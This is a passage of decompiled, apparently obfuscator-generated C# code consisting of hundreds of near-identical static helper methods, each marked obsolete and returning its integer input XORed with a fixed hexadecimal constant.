	public static int smethod_469(int int_4)
	{
		return int_4 ^ 0x60A4AF50;
	}

	[Obsolete("Exclude")]
	public static int smethod_470(int int_4)
	{
		return int_4 ^ 0x4F1AE46E;
	}

	[Obsolete("Exclude")]
	public static int smethod_471(int int_4)
	{
		return int_4 ^ 0x465319F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_472(int int_4)
	{
		return int_4 ^ 0x5D1462C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_473(int int_4)
	{
		return int_4 ^ 0x29643718;
	}

	[Obsolete("Exclude")]
	public static int smethod_474(int int_4)
	{
		return int_4 ^ 0x436E21DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_475(int int_4)
	{
		return int_4 ^ 0xA9CECAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_476(int int_4)
	{
		return int_4 ^ 0x363D1C59;
	}

	[Obsolete("Exclude")]
	public static int smethod_477(int int_4)
	{
		return int_4 ^ 0x5B4A8F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_478(int int_4)
	{
		return int_4 ^ 0x2EDBAD47;
	}

	[Obsolete("Exclude")]
	public static int smethod_479(int int_4)
	{
		return int_4 ^ 0x4BD1F716;
	}

	[Obsolete("Exclude")]
	public static int smethod_480(int int_4)
	{
		return int_4 ^ 0x61F7F188;
	}

	[Obsolete("Exclude")]
	public static int smethod_481(int int_4)
	{
		return int_4 ^ 0x6616F885;
	}

	[Obsolete("Exclude")]
	public static int smethod_482(int int_4)
	{
		return int_4 ^ 0x30D1566B;
	}

	[Obsolete("Exclude")]
	public static int smethod_483(int int_4)
	{
		return int_4 ^ 0x7F1B5688;
	}

	[Obsolete("Exclude")]
	public static int smethod_484(int int_4)
	{
		return int_4 ^ 0x19C332BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_485(int int_4)
	{
		return int_4 ^ 0x29BEE880;
	}

	[Obsolete("Exclude")]
	public static int smethod_486(int int_4)
	{
		return int_4 ^ 0x5BC3F40A;
	}

	[Obsolete("Exclude")]
	public static int smethod_487(int int_4)
	{
		return int_4 ^ 0x6E697594;
	}

	[Obsolete("Exclude")]
	public static int smethod_488(int int_4)
	{
		return int_4 ^ 0x28149193;
	}

	[Obsolete("Exclude")]
	public static int smethod_489(int int_4)
	{
		return int_4 ^ 0x2FAD624E;
	}

	[Obsolete("Exclude")]
	public static int smethod_490(int int_4)
	{
		return int_4 ^ 0x4BB161E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_491(int int_4)
	{
		return int_4 ^ 0x5546E182;
	}

	[Obsolete("Exclude")]
	public static int smethod_492(int int_4)
	{
		return int_4 ^ 0x12DD4189;
	}

	[Obsolete("Exclude")]
	public static int smethod_493(int int_4)
	{
		return int_4 ^ 0x248DFBE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_494(int int_4)
	{
		return int_4 ^ 0x36EC7A3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_495(int int_4)
	{
		return int_4 ^ 0x7E60FD23;
	}

	[Obsolete("Exclude")]
	public static int smethod_496(int int_4)
	{
		return int_4 ^ 0x67FEF95D;
	}

	[Obsolete("Exclude")]
	public static int smethod_497(int int_4)
	{
		return int_4 ^ 0x1F74FC25;
	}

	[Obsolete("Exclude")]
	public static int smethod_498(int int_4)
	{
		return int_4 ^ 0x583B76F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_499(int int_4)
	{
		return int_4 ^ 0x5DC6EFB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_500(int int_4)
	{
		return int_4 ^ 0x7CE39ED2;
	}

	[Obsolete("Exclude")]
	public static int smethod_501(int int_4)
	{
		return int_4 ^ 0x1726ED7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_502(int int_4)
	{
		return int_4 ^ 0x6EA17275;
	}

	[Obsolete("Exclude")]
	public static int smethod_503(int int_4)
	{
		return int_4 ^ 0x518354E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_504(int int_4)
	{
		return int_4 ^ 0x5C0CA930;
	}

	[Obsolete("Exclude")]
	public static int smethod_505(int int_4)
	{
		return int_4 ^ 0x800FBCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_506(int int_4)
	{
		return int_4 ^ 0x1033C80D;
	}

	[Obsolete("Exclude")]
	public static int smethod_507(int int_4)
	{
		return int_4 ^ 0x2A84E122;
	}

	[Obsolete("Exclude")]
	public static int smethod_508(int int_4)
	{
		return int_4 ^ 0x2413B2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_509(int int_4)
	{
		return int_4 ^ 0x5BEE3100;
	}

	[Obsolete("Exclude")]
	public static int smethod_510(int int_4)
	{
		return int_4 ^ 0x2DD37B88;
	}

	[Obsolete("Exclude")]
	public static int smethod_511(int int_4)
	{
		return int_4 ^ 0x55C1403A;
	}

	[Obsolete("Exclude")]
	public static int smethod_512(int int_4)
	{
		return int_4 ^ 0x35E701C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_513(int int_4)
	{
		return int_4 ^ 0x16E1D04B;
	}

	[Obsolete("Exclude")]
	public static int smethod_514(int int_4)
	{
		return int_4 ^ 0x21900440;
	}

	[Obsolete("Exclude")]
	public static int smethod_515(int int_4)
	{
		return int_4 ^ 0x458CC3DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_516(int int_4)
	{
		return int_4 ^ 0x69C4E5D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_517(int int_4)
	{
		return int_4 ^ 0x43977546;
	}

	[Obsolete("Exclude")]
	public static int smethod_518(int int_4)
	{
		return int_4 ^ 0xAEDFBB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_519(int int_4)
	{
		return int_4 ^ 0x36EA3B1A;
	}

	[Obsolete("Exclude")]
	public static int smethod_520(int int_4)
	{
		return int_4 ^ 0x326D78C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_521(int int_4)
	{
		return int_4 ^ 0x26B56A64;
	}

	[Obsolete("Exclude")]
	public static int smethod_522(int int_4)
	{
		return int_4 ^ 0x1053441E;
	}

	[Obsolete("Exclude")]
	public static int smethod_523(int int_4)
	{
		return int_4 ^ 0x4F4AE325;
	}

	[Obsolete("Exclude")]
	public static int smethod_524(int int_4)
	{
		return int_4 ^ 0x5E751F46;
	}

	[Obsolete("Exclude")]
	public static int smethod_525(int int_4)
	{
		return int_4 ^ 0x72C1A85E;
	}

	[Obsolete("Exclude")]
	public static int smethod_526(int int_4)
	{
		return int_4 ^ 0x1AF1A34F;
	}

	[Obsolete("Exclude")]
	public static int smethod_527(int int_4)
	{
		return int_4 ^ 0x1A41B2AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_528(int int_4)
	{
		return int_4 ^ 0x8A980CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_529(int int_4)
	{
		return int_4 ^ 0x6FEFA58D;
	}

	[Obsolete("Exclude")]
	public static int smethod_530(int int_4)
	{
		return int_4 ^ 0xF3D3B58;
	}

	[Obsolete("Exclude")]
	public static int smethod_531(int int_4)
	{
		return int_4 ^ 0x78023355;
	}

	[Obsolete("Exclude")]
	public static int smethod_532(int int_4)
	{
		return int_4 ^ 0x152AB169;
	}

	[Obsolete("Exclude")]
	public static int smethod_533(int int_4)
	{
		return int_4 ^ 0x2205E34C;
	}

	[Obsolete("Exclude")]
	public static int smethod_534(int int_4)
	{
		return int_4 ^ 0x5DC997B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_535(int int_4)
	{
		return int_4 ^ 0x757E1229;
	}

	[Obsolete("Exclude")]
	public static int smethod_536(int int_4)
	{
		return int_4 ^ 0x7872C756;
	}

	[Obsolete("Exclude")]
	public static int smethod_537(int int_4)
	{
		return int_4 ^ 0xA48D019;
	}

	[Obsolete("Exclude")]
	public static int smethod_538(int int_4)
	{
		return int_4 ^ 0xA41E397;
	}

	[Obsolete("Exclude")]
	public static int smethod_539(int int_4)
	{
		return int_4 ^ 0x5CE3BD04;
	}

	[Obsolete("Exclude")]
	public static int smethod_540(int int_4)
	{
		return int_4 ^ 0x3B4A0B9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_541(int int_4)
	{
		return int_4 ^ 0x257F7724;
	}

	[Obsolete("Exclude")]
	public static int smethod_542(int int_4)
	{
		return int_4 ^ 0x4FD33129;
	}

	[Obsolete("Exclude")]
	public static int smethod_543(int int_4)
	{
		return int_4 ^ 0x7C0BC9CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_544(int int_4)
	{
		return int_4 ^ 0x438CA4AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_545(int int_4)
	{
		return int_4 ^ 0x12E00B69;
	}

	[Obsolete("Exclude")]
	public static int smethod_546(int int_4)
	{
		return int_4 ^ 0x3B1B814C;
	}

	[Obsolete("Exclude")]
	public static int smethod_547(int int_4)
	{
		return int_4 ^ 0x2DB5A1BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_548(int int_4)
	{
		return int_4 ^ 0x729C25BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_549(int int_4)
	{
		return int_4 ^ 0x3AF993FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_550(int int_4)
	{
		return int_4 ^ 0x4F06474A;
	}

	[Obsolete("Exclude")]
	public static int smethod_551(int int_4)
	{
		return int_4 ^ 0x4FE8C1F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_552(int int_4)
	{
		return int_4 ^ 0x771099DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_553(int int_4)
	{
		return int_4 ^ 0x6F511ABD;
	}

	[Obsolete("Exclude")]
	public static int smethod_554(int int_4)
	{
		return int_4 ^ 0x569EA19E;
	}

	[Obsolete("Exclude")]
	public static int smethod_555(int int_4)
	{
		return int_4 ^ 0x410A1EC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_556(int int_4)
	{
		return int_4 ^ 0x3A1F2E88;
	}

	[Obsolete("Exclude")]
	public static int smethod_557(int int_4)
	{
		return int_4 ^ 0x5B614E;
	}

	[Obsolete("Exclude")]
	public static int smethod_558(int int_4)
	{
		return int_4 ^ 0xE2C03C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_559(int int_4)
	{
		return int_4 ^ 0x1BD4E37B;
	}

	[Obsolete("Exclude")]
	public static int smethod_560(int int_4)
	{
		return int_4 ^ 0x7908382C;
	}

	[Obsolete("Exclude")]
	public static int smethod_561(int int_4)
	{
		return int_4 ^ 0x750E990A;
	}

	[Obsolete("Exclude")]
	public static int smethod_562(int int_4)
	{
		return int_4 ^ 0x2102423A;
	}

	[Obsolete("Exclude")]
	public static int smethod_563(int int_4)
	{
		return int_4 ^ 0x7B9617B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_564(int int_4)
	{
		return int_4 ^ 0x7552B93D;
	}

	[Obsolete("Exclude")]
	public static int smethod_565(int int_4)
	{
		return int_4 ^ 0x30C49882;
	}

	[Obsolete("Exclude")]
	public static int smethod_566(int int_4)
	{
		return int_4 ^ 0x70F460AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_567(int int_4)
	{
		return int_4 ^ 0xD517B46;
	}

	[Obsolete("Exclude")]
	public static int smethod_568(int int_4)
	{
		return int_4 ^ 0x7561EF24;
	}

	[Obsolete("Exclude")]
	public static int smethod_569(int int_4)
	{
		return int_4 ^ 0xA830C54;
	}

	[Obsolete("Exclude")]
	public static int smethod_570(int int_4)
	{
		return int_4 ^ 0x734170CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_571(int int_4)
	{
		return int_4 ^ 0x16AD51AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_572(int int_4)
	{
		return int_4 ^ 0x260051DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_573(int int_4)
	{
		return int_4 ^ 0x336F1194;
	}

	[Obsolete("Exclude")]
	public static int smethod_574(int int_4)
	{
		return int_4 ^ 0x75A467EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_575(int int_4)
	{
		return int_4 ^ 0x1ED93175;
	}

	[Obsolete("Exclude")]
	public static int smethod_576(int int_4)
	{
		return int_4 ^ 0x6310898;
	}

	[Obsolete("Exclude")]
	public static int smethod_577(int int_4)
	{
		return int_4 ^ 0x7B2791DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_578(int int_4)
	{
		return int_4 ^ 0x784CEB03;
	}

	[Obsolete("Exclude")]
	public static int smethod_579(int int_4)
	{
		return int_4 ^ 0x67156EBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_580(int int_4)
	{
		return int_4 ^ 0x359A08E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_581(int int_4)
	{
		return int_4 ^ 0x23AE2674;
	}

	[Obsolete("Exclude")]
	public static int smethod_582(int int_4)
	{
		return int_4 ^ 0x25A93B59;
	}

	[Obsolete("Exclude")]
	public static int smethod_583(int int_4)
	{
		return int_4 ^ 0x4E4BFC76;
	}

	[Obsolete("Exclude")]
	public static int smethod_584(int int_4)
	{
		return int_4 ^ 0x529CA47A;
	}

	[Obsolete("Exclude")]
	public static int smethod_585(int int_4)
	{
		return int_4 ^ 0x1679B2CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_586(int int_4)
	{
		return int_4 ^ 0x7A178AB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_587(int int_4)
	{
		return int_4 ^ 0x1C1700E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_588(int int_4)
	{
		return int_4 ^ 0x6473138C;
	}

	[Obsolete("Exclude")]
	public static int smethod_589(int int_4)
	{
		return int_4 ^ 0x5CC24306;
	}

	[Obsolete("Exclude")]
	public static int smethod_590(int int_4)
	{
		return int_4 ^ 0x3F041D2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_591(int int_4)
	{
		return int_4 ^ 0x68FDEB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_592(int int_4)
	{
		return int_4 ^ 0x1BECA41E;
	}

	[Obsolete("Exclude")]
	public static int smethod_593(int int_4)
	{
		return int_4 ^ 0x51E41295;
	}

	[Obsolete("Exclude")]
	public static int smethod_594(int int_4)
	{
		return int_4 ^ 0xF861E00;
	}

	[Obsolete("Exclude")]
	public static int smethod_595(int int_4)
	{
		return int_4 ^ 0x3C9BED2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_596(int int_4)
	{
		return int_4 ^ 0x32C8F3B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_597(int int_4)
	{
		return int_4 ^ 0x37220035;
	}

	[Obsolete("Exclude")]
	public static int smethod_598(int int_4)
	{
		return int_4 ^ 0x5A36EB03;
	}

	[Obsolete("Exclude")]
	public static int smethod_599(int int_4)
	{
		return int_4 ^ 0x61DBA858;
	}

	[Obsolete("Exclude")]
	public static int smethod_600(int int_4)
	{
		return int_4 ^ 0xB873DDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_601(int int_4)
	{
		return int_4 ^ 0x55CD68BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_602(int int_4)
	{
		return int_4 ^ 0x2839131A;
	}

	[Obsolete("Exclude")]
	public static int smethod_603(int int_4)
	{
		return int_4 ^ 0x1C390C43;
	}

	[Obsolete("Exclude")]
	public static int smethod_604(int int_4)
	{
		return int_4 ^ 0x51AE2A66;
	}

	[Obsolete("Exclude")]
	public static int smethod_605(int int_4)
	{
		return int_4 ^ 0x7492B37F;
	}

	[Obsolete("Exclude")]
	public static int smethod_606(int int_4)
	{
		return int_4 ^ 0x3A73DFD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_607(int int_4)
	{
		return int_4 ^ 0x1348DFCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_608(int int_4)
	{
		return int_4 ^ 0x59F001A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_609(int int_4)
	{
		return int_4 ^ 0x720D13CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_610(int int_4)
	{
		return int_4 ^ 0x7B43724;
	}

	[Obsolete("Exclude")]
	public static int smethod_611(int int_4)
	{
		return int_4 ^ 0x1D95BB5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_612(int int_4)
	{
		return int_4 ^ 0x682CFBC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_613(int int_4)
	{
		return int_4 ^ 0x515D2C0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_614(int int_4)
	{
		return int_4 ^ 0x3FC16C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_615(int int_4)
	{
		return int_4 ^ 0x5B812619;
	}

	[Obsolete("Exclude")]
	public static int smethod_616(int int_4)
	{
		return int_4 ^ 0x2E2027B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_617(int int_4)
	{
		return int_4 ^ 0x3B8169E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_618(int int_4)
	{
		return int_4 ^ 0x63DFA4A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_619(int int_4)
	{
		return int_4 ^ 0x6C153BA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_620(int int_4)
	{
		return int_4 ^ 0x15A9F62A;
	}

	[Obsolete("Exclude")]
	public static int smethod_621(int int_4)
	{
		return int_4 ^ 0x7CBE72EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_622(int int_4)
	{
		return int_4 ^ 0x72596AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_623(int int_4)
	{
		return int_4 ^ 0x24695419;
	}

	[Obsolete("Exclude")]
	public static int smethod_624(int int_4)
	{
		return int_4 ^ 0x10406764;
	}

	[Obsolete("Exclude")]
	public static int smethod_625(int int_4)
	{
		return int_4 ^ 0x1D9C8949;
	}

	[Obsolete("Exclude")]
	public static int smethod_626(int int_4)
	{
		return int_4 ^ 0x758DD27D;
	}

	[Obsolete("Exclude")]
	public static int smethod_627(int int_4)
	{
		return int_4 ^ 0x44855C50;
	}

	[Obsolete("Exclude")]
	public static int smethod_628(int int_4)
	{
		return int_4 ^ 0x30E3A3EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_629(int int_4)
	{
		return int_4 ^ 0x55041611;
	}

	[Obsolete("Exclude")]
	public static int smethod_630(int int_4)
	{
		return int_4 ^ 0x55729151;
	}

	[Obsolete("Exclude")]
	public static int smethod_631(int int_4)
	{
		return int_4 ^ 0x40D9C3AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_632(int int_4)
	{
		return int_4 ^ 0x3E7696A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_633(int int_4)
	{
		return int_4 ^ 0x1D01E549;
	}

	[Obsolete("Exclude")]
	public static int smethod_634(int int_4)
	{
		return int_4 ^ 0x2D1408C;
	}

	[Obsolete("Exclude")]
	public static int smethod_635(int int_4)
	{
		return int_4 ^ 0x36C2086E;
	}

	[Obsolete("Exclude")]
	public static int smethod_636(int int_4)
	{
		return int_4 ^ 0x2295962;
	}

	[Obsolete("Exclude")]
	public static int smethod_637(int int_4)
	{
		return int_4 ^ 0x78D00F0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_638(int int_4)
	{
		return int_4 ^ 0x6C19FB61;
	}

	[Obsolete("Exclude")]
	public static int smethod_639(int int_4)
	{
		return int_4 ^ 0x6AA7B633;
	}

	[Obsolete("Exclude")]
	public static int smethod_640(int int_4)
	{
		return int_4 ^ 0x6F3D66D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_641(int int_4)
	{
		return int_4 ^ 0x7DDAE7FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_642(int int_4)
	{
		return int_4 ^ 0x3DEF1E14;
	}

	[Obsolete("Exclude")]
	public static int smethod_643(int int_4)
	{
		return int_4 ^ 0x53FBF5BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_644(int int_4)
	{
		return int_4 ^ 0x4E18210;
	}

	[Obsolete("Exclude")]
	public static int smethod_645(int int_4)
	{
		return int_4 ^ 0x7031E1EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_646(int int_4)
	{
		return int_4 ^ 0x1A1A11AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_647(int int_4)
	{
		return int_4 ^ 0x2C46D0C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_648(int int_4)
	{
		return int_4 ^ 0x1C20A62D;
	}

	[Obsolete("Exclude")]
	public static int smethod_649(int int_4)
	{
		return int_4 ^ 0x5F15FF5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_650(int int_4)
	{
		return int_4 ^ 0x72ACFCD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_651(int int_4)
	{
		return int_4 ^ 0x1975B14F;
	}

	[Obsolete("Exclude")]
	public static int smethod_652(int int_4)
	{
		return int_4 ^ 0x6FAB068;
	}

	[Obsolete("Exclude")]
	public static int smethod_653(int int_4)
	{
		return int_4 ^ 0x5FDDF588;
	}

	[Obsolete("Exclude")]
	public static int smethod_654(int int_4)
	{
		return int_4 ^ 0x20E365A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_655(int int_4)
	{
		return int_4 ^ 0x5BF1642;
	}

	[Obsolete("Exclude")]
	public static int smethod_656(int int_4)
	{
		return int_4 ^ 0x41E8E808;
	}

	[Obsolete("Exclude")]
	public static int smethod_657(int int_4)
	{
		return int_4 ^ 0x2E9AC79;
	}

	[Obsolete("Exclude")]
	public static int smethod_658(int int_4)
	{
		return int_4 ^ 0x7138BDAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_659(int int_4)
	{
		return int_4 ^ 0x6AD62E53;
	}

	[Obsolete("Exclude")]
	public static int smethod_660(int int_4)
	{
		return int_4 ^ 0x763EF676;
	}

	[Obsolete("Exclude")]
	public static int smethod_661(int int_4)
	{
		return int_4 ^ 0x74CC1A38;
	}

	[Obsolete("Exclude")]
	public static int smethod_662(int int_4)
	{
		return int_4 ^ 0x754EF777;
	}

	[Obsolete("Exclude")]
	public static int smethod_663(int int_4)
	{
		return int_4 ^ 0x101D7250;
	}

	[Obsolete("Exclude")]
	public static int smethod_664(int int_4)
	{
		return int_4 ^ 0x44DA85FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_665(int int_4)
	{
		return int_4 ^ 0x1568EB63;
	}

	[Obsolete("Exclude")]
	public static int smethod_666(int int_4)
	{
		return int_4 ^ 0x17FB85FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_667(int int_4)
	{
		return int_4 ^ 0x6EBC7995;
	}

	[Obsolete("Exclude")]
	public static int smethod_668(int int_4)
	{
		return int_4 ^ 0x1396C4A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_669(int int_4)
	{
		return int_4 ^ 0x4F12D0E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_670(int int_4)
	{
		return int_4 ^ 0x5DCC309E;
	}

	[Obsolete("Exclude")]
	public static int smethod_671(int int_4)
	{
		return int_4 ^ 0x76FCDAA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_672(int int_4)
	{
		return int_4 ^ 0x53DC0B9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_673(int int_4)
	{
		return int_4 ^ 0x587C44C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_674(int int_4)
	{
		return int_4 ^ 0x4A8C0C23;
	}

	[Obsolete("Exclude")]
	public static int smethod_675(int int_4)
	{
		return int_4 ^ 0x4C78C783;
	}

	[Obsolete("Exclude")]
	public static int smethod_676(int int_4)
	{
		return int_4 ^ 0x754C6A84;
	}

	[Obsolete("Exclude")]
	public static int smethod_677(int int_4)
	{
		return int_4 ^ 0x2A0525E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_678(int int_4)
	{
		return int_4 ^ 0x43A48C55;
	}

	[Obsolete("Exclude")]
	public static int smethod_679(int int_4)
	{
		return int_4 ^ 0xC4B9286;
	}

	[Obsolete("Exclude")]
	public static int smethod_680(int int_4)
	{
		return int_4 ^ 0x6ACBBE52;
	}

	[Obsolete("Exclude")]
	public static int smethod_681(int int_4)
	{
		return int_4 ^ 0x4E0F8107;
	}

	[Obsolete("Exclude")]
	public static int smethod_682(int int_4)
	{
		return int_4 ^ 0x3B15A5F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_683(int int_4)
	{
		return int_4 ^ 0x2C0F306B;
	}

	[Obsolete("Exclude")]
	public static int smethod_684(int int_4)
	{
		return int_4 ^ 0x26DAF4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_685(int int_4)
	{
		return int_4 ^ 0x367DC5CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_686(int int_4)
	{
		return int_4 ^ 0x1CC392F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_687(int int_4)
	{
		return int_4 ^ 0x185E566A;
	}

	[Obsolete("Exclude")]
	public static int smethod_688(int int_4)
	{
		return int_4 ^ 0x5C9F371F;
	}

	[Obsolete("Exclude")]
	public static int smethod_689(int int_4)
	{
		return int_4 ^ 0x6BD8267;
	}

	[Obsolete("Exclude")]
	public static int smethod_690(int int_4)
	{
		return int_4 ^ 0x5793F3B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_691(int int_4)
	{
		return int_4 ^ 0x1E0FB2B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_692(int int_4)
	{
		return int_4 ^ 0x2EFE69DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_693(int int_4)
	{
		return int_4 ^ 0x5C826F55;
	}

	[Obsolete("Exclude")]
	public static int smethod_694(int int_4)
	{
		return int_4 ^ 0x2C75365D;
	}

	[Obsolete("Exclude")]
	public static int smethod_695(int int_4)
	{
		return int_4 ^ 0xB318562;
	}

	[Obsolete("Exclude")]
	public static int smethod_696(int int_4)
	{
		return int_4 ^ 0x1B8A66B9;
	}

	[Obsolete("Exclude")]
	public static int smethod_697(int int_4)
	{
		return int_4 ^ 0x17335736;
	}

	[Obsolete("Exclude")]
	public static int smethod_698(int int_4)
	{
		return int_4 ^ 0x57B7D06E;
	}

	[Obsolete("Exclude")]
	public static int smethod_699(int int_4)
	{
		return int_4 ^ 0x7F5622F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_700(int int_4)
	{
		return int_4 ^ 0x3098135C;
	}

	[Obsolete("Exclude")]
	public static int smethod_701(int int_4)
	{
		return int_4 ^ 0x7A7F0FAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_702(int int_4)
	{
		return int_4 ^ 0x132143E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_703(int int_4)
	{
		return int_4 ^ 0x644B6D77;
	}

	[Obsolete("Exclude")]
	public static int smethod_704(int int_4)
	{
		return int_4 ^ 0x3D333C07;
	}

	[Obsolete("Exclude")]
	public static int smethod_705(int int_4)
	{
		return int_4 ^ 0x7E63152D;
	}

	[Obsolete("Exclude")]
	public static int smethod_706(int int_4)
	{
		return int_4 ^ 0x9C526C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_707(int int_4)
	{
		return int_4 ^ 0x43FBA822;
	}

	[Obsolete("Exclude")]
	public static int smethod_708(int int_4)
	{
		return int_4 ^ 0x2EE8FD1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_709(int int_4)
	{
		return int_4 ^ 0x473CE015;
	}

	[Obsolete("Exclude")]
	public static int smethod_710(int int_4)
	{
		return int_4 ^ 0x45C948EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_711(int int_4)
	{
		return int_4 ^ 0x56660722;
	}

	[Obsolete("Exclude")]
	public static int smethod_712(int int_4)
	{
		return int_4 ^ 0x5518D8D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_713(int int_4)
	{
		return int_4 ^ 0x73204A1D;
	}

	[Obsolete("Exclude")]
	public static int smethod_714(int int_4)
	{
		return int_4 ^ 0xED79754;
	}

	[Obsolete("Exclude")]
	public static int smethod_715(int int_4)
	{
		return int_4 ^ 0x252E5E18;
	}

	[Obsolete("Exclude")]
	public static int smethod_716(int int_4)
	{
		return int_4 ^ 0x7B9D898D;
	}

	[Obsolete("Exclude")]
	public static int smethod_717(int int_4)
	{
		return int_4 ^ 0x5C350B67;
	}

	[Obsolete("Exclude")]
	public static int smethod_718(int int_4)
	{
		return int_4 ^ 0x2B6C02F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_719(int int_4)
	{
		return int_4 ^ 0x618A108E;
	}

	[Obsolete("Exclude")]
	public static int smethod_720(int int_4)
	{
		return int_4 ^ 0x189B1F27;
	}

	[Obsolete("Exclude")]
	public static int smethod_721(int int_4)
	{
		return int_4 ^ 0x48ACFA98;
	}

	[Obsolete("Exclude")]
	public static int smethod_722(int int_4)
	{
		return int_4 ^ 0x5BD63A9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_723(int int_4)
	{
		return int_4 ^ 0x558059C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_724(int int_4)
	{
		return int_4 ^ 0xE58A947;
	}

	[Obsolete("Exclude")]
	public static int smethod_725(int int_4)
	{
		return int_4 ^ 0x6B72B629;
	}

	[Obsolete("Exclude")]
	public static int smethod_726(int int_4)
	{
		return int_4 ^ 0x17FF5E64;
	}

	[Obsolete("Exclude")]
	public static int smethod_727(int int_4)
	{
		return int_4 ^ 0x3293668C;
	}

	[Obsolete("Exclude")]
	public static int smethod_728(int int_4)
	{
		return int_4 ^ 0x43274DD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_729(int int_4)
	{
		return int_4 ^ 0x3DC3BBF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_730(int int_4)
	{
		return int_4 ^ 0x12EC771;
	}

	[Obsolete("Exclude")]
	public static int smethod_731(int int_4)
	{
		return int_4 ^ 0x222D5C5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_732(int int_4)
	{
		return int_4 ^ 0x43E28E58;
	}

	[Obsolete("Exclude")]
	public static int smethod_733(int int_4)
	{
		return int_4 ^ 0x79E4CB97;
	}

	[Obsolete("Exclude")]
	public static int smethod_734(int int_4)
	{
		return int_4 ^ 0x3969264E;
	}

